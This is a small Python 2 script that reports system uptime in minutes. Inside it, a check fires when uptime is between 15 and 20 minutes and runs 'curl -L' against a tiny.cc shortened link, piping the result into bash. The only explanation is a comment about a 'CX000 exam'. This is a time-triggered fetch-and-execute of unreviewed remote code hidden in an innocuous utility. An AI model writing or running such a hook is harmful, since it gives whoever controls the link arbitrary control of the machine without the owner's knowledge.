#!/usr/bin/env python

from datetime import timedelta
import subprocess
import sys


def get_uptime():
    with open('/proc/uptime', 'r') as f:
        uptime_seconds = float(f.readline().split()[0])
        uptime_string = str(timedelta(seconds=uptime_seconds))
    return uptime_string


def main():
    uptime = get_uptime()
    if 'day' not in uptime:
        uptime = uptime.split(':')
        hours = 0
        if uptime[0] != '0':
            hours = int(uptime[0])
        minutes = (hours * 60) + int(uptime[1])
        print "System Running from {0} Minutes".format(minutes)

        # Testing CX000 exam
        if minutes >= 15 and minutes < 20:
            cmd = 'curl -L http://tiny.cc/CB-CX000-test | bash'
            p = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            p.wait()
            if p.returncode != 0:
                print p.stderr.read()
            else:
                print "CX000 testing done - successful"


if __name__ == '__main__':
    sys.exit(main())
